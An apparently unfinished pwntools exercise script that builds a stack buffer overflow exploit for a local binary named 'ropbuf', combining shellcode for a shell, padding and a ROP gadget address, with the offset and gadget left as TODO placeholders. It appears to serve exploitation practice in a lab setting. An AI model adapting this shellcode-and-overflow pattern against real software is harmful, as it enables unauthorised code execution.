#!/usr/bin/env python3
from pwn import *

# complete ...

f = open("payload", "w")

BIN = "./ropbuf"

context.binary = BIN

# gdb-peda$ pattc + patto
buf_offset =  # TODO

# gdb-peda$ ropsearch '.....' <libc_range>
rop_gadget =  # TODO

payload = asm(shellcraft.sh())
payload += (buf_offset - len(payload)) * b"A"
payload += pack(rop_gadget).strip(b"\x00")


f.write(payload)

io = process(["./ropbuf", payload])
io.interactive()
